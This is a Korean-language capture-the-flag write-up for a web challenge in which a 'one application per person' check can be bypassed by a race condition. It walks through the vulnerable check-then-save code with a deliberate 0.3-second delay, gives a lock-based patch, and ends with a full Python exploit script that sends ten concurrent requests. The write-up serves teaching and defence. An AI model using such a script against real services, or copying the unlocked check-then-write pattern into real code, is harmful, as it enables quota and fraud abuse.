# medium-05 — 1인 1원서 풀이

## 1. 문제 개요

| 항목 | 내용 |
|---|---|
| 분류 | Web / 경쟁 상태(Race Condition) |
| 난이도 | Medium |
| 접속 | `http://<출제조IP>:8005` |
| 시작 | 회원가입으로 계정 생성 (일반 신청자) |
| 플래그 위치 | 내 신청서가 두 장 이상일 때 `/mypage` 에 보이는 확인 코드 |

최종 목표: "1인 1매"만 허용하는 신청 시스템에서 한 계정으로 신청서를 두 장 이상 내서 확인 코드를 얻는다.

최종 경로: 같은 계정으로 신청서를 동시에 여러 장 보내 중복 확인을 함께 통과시킨다.

---

## 2. 의도한 풀이 과정 (요약)

1. 신청서를 한 장 낸 뒤 다시 내면 "1인 1매" 메시지와 함께 거절된다. 막는 장치가 있다는 걸 확인한다.
2. 소스에서 중복 확인(`already_applied`)과 저장이 따로 일어나고, 그 사이에 0.3초 쉬는 걸 찾는다.
3. 서버가 요청을 동시에 처리하는지(`threaded=True`) 확인한다.
4. 신청서를 한꺼번에 여러 장 보낸다. 모두가 "아직 낸 적 없음"을 보고 통과해서 여러 장이 저장된다.
5. `/mypage` 에 신청서가 두 장 이상 보이고 확인 코드가 나온다.

---

## 3. 초기 분석과 단서

- 문제 설명: "신청 마감일 오후, 서버가 유난히 느리다", "신청서를 두 장 낸 사람이 있다". 느린 서버와 중복이라는 두 단서가 한 문장에 있다.
- 신청서를 정상적으로 두 번 내면 두 번째는 거절된다. 순서대로 보내서는 안 된다.
- `routes/mypage.py` 18번째 줄: 내 신청서가 2장 이상이면 확인 코드를 보여준다.

```python
flag = current_app.config["FLAG_DEADLINE"] if len(applications) >= 2 else None
```

---

## 4. 취약점의 원인과 성립 조건

코드 위치: `routes/apply.py`

```python
def already_applied(user_id):
    applied = any(a["user_id"] == user_id for a in data.APPLICATIONS.values())   # (A) 지금 상태를 본다
    time.sleep(0.3)                                                               # (B) 0.3초 쉰다
    return applied

...
        if already_applied(user["id"]):        # (C) 확인
            flash("추가 신청은 1인 1매만 가능합니다.", "error")
            return redirect(...)

        app_id = data.next_application_id()   # (D) 저장은 그 다음
        data.APPLICATIONS[app_id] = {...}
```

- 원인: 확인(A)과 저장(D)이 한 덩어리가 아니다. 확인하는 순간의 결과를 0.3초 들고 있다가 저장하므로, 그 사이에 들어온 다른 요청도 "아직 없음"을 본다.
- 성립 조건
  - 서버가 요청을 동시에 처리한다 (`app.py` 의 `threaded=True`).
  - 같은 계정(같은 세션 쿠키)으로 0.3초 안에 두 개 이상의 요청을 보낸다.

```
요청 1: 확인(없음) ── 0.3초 ── 저장 (1장)
요청 2:   확인(없음) ── 0.3초 ── 저장 (2장)
요청 3:     확인(없음) ── 0.3초 ── 저장 (3장)
```

---

## 5. 풀이 결과

- 성공 기준: `/mypage` 에 내 신청서가 2장 이상 보이고 `중복 신청 확인 코드 GlassHouse{...}` 가 나온다.
- 브라우저 두 탭에서 동시에 제출 버튼을 눌러도 되지만, 스크립트로 10개를 동시에 보내는 편이 확실하다.

```bash
$ python3 exploit.py http://127.0.0.1:8005
[*] 내 신청서 10장
[+] FLAG: GlassHouse{...}
```

---

## 6. 패치 방안과 검증

확인과 저장을 하나의 잠금 안에서 한다. 다른 요청은 앞의 요청이 저장을 끝낸 뒤에야 확인할 수 있다.

```python
import threading

apply_lock = threading.Lock()

        with apply_lock:
            if already_applied(user["id"]):
                flash("추가 신청은 1인 1매만 가능합니다.", "error")
                return redirect(url_for("mypage.list_applications"))
            app_id = data.next_application_id()
            data.APPLICATIONS[app_id] = {...}
```

실제 서비스라면 DB 에 "사용자당 신청서 하나" 제약(UNIQUE)을 거는 것이 가장 확실하다.

검증: 패치 후 같은 익스플로잇을 실행하면 신청서가 1장만 남고 확인 코드가 나오지 않는다.

---

## 7. 익스플로잇 코드

같은 폴더의 [exploit.py](exploit.py) 와 같습니다.

```python
#!/usr/bin/env python3
# medium-05 (1인 1원서) - 중복 확인과 저장 사이의 틈에 신청서를 동시에 여러 장 보낸다
# 사용: python3 exploit.py http://<IP>:8005
import re
import sys
import threading
import uuid

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8005"
s = requests.Session()

# 0) 회원가입 + 로그인 (실행할 때마다 새 계정)
user = "racer" + uuid.uuid4().hex[:8]
s.post(f"{BASE}/signup", data={"username": user, "password": "pw1234",
        "password_confirm": "pw1234", "name": "racer", "email": "r@r.com"})
s.post(f"{BASE}/login", data={"username": user, "password": "pw1234"})
cookie = s.cookies.get_dict()


# 1) 같은 세션으로 신청서를 동시에 10장 보낸다
def apply():
    requests.post(f"{BASE}/apply", cookies=cookie, allow_redirects=False,
                  data={"school": "a", "major": "a", "intro": "a"})


threads = [threading.Thread(target=apply) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# 2) 내 신청서가 두 장 이상이면 /mypage 에 확인 코드가 보인다
page = s.get(f"{BASE}/mypage").text
count = len(set(re.findall(r"/applications/(\d+)", page)))
flag = re.search(r"GlassHouse\{[^}]*\}", page)
print(f"[*] 내 신청서 {count}장")
print(f"[+] FLAG: {flag.group(0)}" if flag else "[-] 실패. 다시 실행해 보십시오")
```
